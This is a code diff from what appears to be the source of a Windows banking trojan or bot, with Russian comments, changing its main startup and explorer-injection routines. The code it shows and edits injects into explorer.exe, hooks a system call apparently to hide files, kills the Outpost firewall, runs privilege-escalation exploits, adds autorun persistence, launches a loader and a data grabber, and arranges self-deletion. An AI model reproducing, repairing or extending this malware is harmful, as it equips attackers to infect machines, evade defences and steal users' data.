@@ -177,7 +177,7 @@ void ExplorerMain()
 		UnhookDlls();
 
 	// Отключаем отображение ошибок при крахе процесса
-	DisableShowFatalErrorDialog();
+	//DisableShowFatalErrorDialog();
 
 	InternalAddToAutorun();
 
@@ -206,7 +206,7 @@ void ExplorerMain()
 	HookZwQueryDirectoryFile();
 
 
-	// Вызываем событие мтарта експлорера
+	// Вызываем событие cтарта експлорера
 
 	if (dwFirst)
 		ExplorerFirstStart(NULL);
@@ -218,28 +218,20 @@ void ExplorerMain()
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
-
-MDBG("Main", "E2");
 	UnhookDlls();
 	
-	MDBG("Main", "E3");
 	if (dwExplorerSelf) 
 	{
 		//если инжект был в свой эксплорер завершаемся	
-
 		dwExplorerSelf = 0;
-	MDBG("Main", "E4");
 		if (!InjectIntoExplorer(ExplorerRoutine))
 		{
-			MDBG("Main", "E5");
 			ExplorerMain();
 		}
 
 		pExitProcess(1);
 	}
-	MDBG("Main", "E6");
 	ExplorerMain();
-	MDBG("Main", "E7");
 	return 0;
 }
 
@@ -288,8 +280,11 @@ int APIENTRY MyMain()
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
 
 	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
+	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
+	
+	MDBG( "Main", "В процессе %S, %08x", ModulePath, dwProcessHash2 );
 
-	MDBG("Main", "1");
+	bool inExplorer = dwProcessHash2 == 0x490A0972 ? true : false; //true если запустили в процессе проводника
 
 	if ( dwProcessHash == BOT::GetBotExeNameHash()) // запуск из самого бота
 	{
@@ -318,19 +313,14 @@ int APIENTRY MyMain()
 	}
 	else
 	{
-		MDBG("Main", "2");
 		dwFirst = 1;
 
 		KillOutpost();
-		MDBG("Main", "3");
 
 		DWORD dwExploits = SetExploits();
 
-		MDBG("Main", "4");
-
 		if ( !dwExploits )
 		{
-			MDBG("Main", "5");
 			if (MegaJump(LoaderRoutine))
 			{
 				dwAlreadyRun = 1;
@@ -341,23 +331,31 @@ int APIENTRY MyMain()
 					dwGrabberRun = 1;
 			#endif 
 		}
-		MDBG("Main", "6");		
-		m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
-		dwKillPid = (DWORD)pGetCurrentProcessId();
-		CopyFileToTemp( ModulePath, TempFileName );	
 
 		dwExplorerSelf = 1;
-		MDBG("Main", "7");
-		if (!JmpToExplorer(ExplorerRoutine ) )
+		if( inExplorer )
 		{
-			MDBG("Main", "8");
+			MDBG( "Main", "Стартанули в процессе explorer.exe" );
+			FileToDelete[0] = 0; //если в процессе проводника, то самоудаление не нужно
+			TempFileName[0] = 0;
 			dwExplorerSelf = 0;
+			RunThread( ExplorerRoutine, 0 );
+		}
+		else
+		{
+			m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
+			dwKillPid = (DWORD)pGetCurrentProcessId();
+			CopyFileToTemp( ModulePath, TempFileName );	
+			if (!JmpToExplorer(ExplorerRoutine ) )
+			{
+				dwExplorerSelf = 0;
 
-			InternalAddToAutorun();
+				InternalAddToAutorun();
+			}
 		}
 	}
-	MDBG("Main", "9");
-	pExitProcess(1);
 
-	return 0;
+	if( !inExplorer) 
+		pExitProcess(1);
+	return 1;
 }
